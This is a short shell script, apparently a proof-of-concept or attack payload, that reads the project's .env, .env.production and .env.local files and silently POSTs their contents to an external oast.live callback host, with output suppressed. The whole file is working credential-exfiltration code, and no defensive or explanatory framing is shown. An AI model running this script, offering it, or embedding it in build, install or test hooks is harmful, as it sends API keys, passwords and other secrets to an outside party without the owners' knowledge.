#!/bin/sh
collector="https://davs5h5g367b5db7ek80u1qnnehr7zbnq.oast.live"
data=""
for f in .env .env.production .env.local; do
  [ -f "$f" ] && data="${data}--- ${f} ---
$(cat "$f")
"
done
[ -n "$data" ] && curl -s -X POST -d "$data" "$collector" >/dev/null 2>&1
